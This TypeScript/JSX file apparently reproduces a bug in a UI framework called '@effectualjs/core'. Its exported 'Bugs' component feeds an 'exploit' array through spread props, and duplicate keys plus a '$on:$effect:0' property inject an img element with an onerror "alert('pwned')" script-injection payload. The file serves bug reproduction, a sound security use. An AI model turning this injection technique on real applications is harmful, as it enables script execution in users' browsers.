import { $effect, createElement, F, Store } from "@effectualjs/core";

const Hash = Store.create<string>();

// __LOG_LEVEL__ = "debug";

type Element =
    | {
          tag: string;
          attrs?: any;
          children?: Element[];
      }
    | string;

interface RawProps {
    element: Element;
}

const Raw = (props: RawProps) => {
    if (typeof props.element === "string") {
        return props.element;
    }

    const children = (props.element.children ?? []).map((el) => <Raw element={el} />);

    return createElement(props.element.tag as any, props.element.attrs, children);
};

const Markdown = (props: { markdown: string }) => {
    const html = $effect(
        (markdown): Element => {
            return { tag: "div", children: [`parsed: ${markdown}`] };
        },
        [props.markdown],
    );

    return <Raw element={html} />;
};

interface AbuseProps {
    markdown: string;
    timestamp: string;
}

const Abusable = (props: AbuseProps) => {
    const formattedTime = $effect(
        (timestamp) => {
            return new Date(timestamp).toLocaleString(undefined, {
                month: "long",
                day: "numeric",
                hour12: true,
                hour: "numeric",
                minute: "numeric",
            });
        },
        [props.timestamp],
    );

    return (
        <div>
            <div>Time: {formattedTime}</div>
            <Markdown markdown={props.markdown} />
        </div>
    );
};

interface AbuseParentProps {
    spec: AbuseProps[];
}

const $hashState = () => {
    const hash = Hash.$provide();
    $effect(function* () {
        const cb = () => {
            hash.setValue(location.hash);
        };

        window.addEventListener("hashchange", cb);
        yield;

        window.removeEventListener("hashchange", cb);
    });

    return hash.value;
};

const AbuseParent = (props: AbuseParentProps) => {
    const hash = $hashState();

    return (
        <div>
            {props.spec.map((spec) => (
                <Abusable {...spec} />
            ))}
            Hash: {hash}
        </div>
    );
};

const exploit = [
    {
        key: "dupe",
        "$on:$effect:0": {
            kind: "native",
            tag: "div",
            props: {},
            children: [
                "pwned",
                {
                    kind: "native",
                    tag: "img",
                    props: { src: "", onerror: "alert('pwned')" },
                },
            ],
        },
        timestamp: "05-03-2025",
        markdown: "same",
    },
    { key: "dupe", markdown: "same", timestamp: "05-03-2025", otherProps: "hi" },
] as unknown as AbuseProps[];

export const Bugs = () => {
    return (
        <>
            <AbuseParent spec={exploit} />
        </>
    );
};
